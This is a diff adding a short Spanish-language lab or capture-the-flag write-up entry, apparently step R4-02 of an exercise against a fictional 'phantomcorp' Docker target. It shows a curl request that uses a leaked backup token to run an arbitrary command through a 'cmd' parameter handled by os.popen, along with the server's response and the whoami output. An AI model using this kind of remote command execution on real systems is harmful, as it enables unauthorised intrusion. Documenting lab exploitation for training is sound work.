@@ -1,0 +1,11 @@
+# R4-02 — Con el token del backup (R3): ejecución de comando arbitrario (RCE) vía os.popen.
+$ curl -i 'http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=whoami'
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Thu, 19 Nov 2026 22:06:35 GMT
+Content-Type: text/plain
+
+$ whoami
+Gerit
+
+# (en el target Docker el proceso corre como el usuario del contenedor; acá, la instancia local)
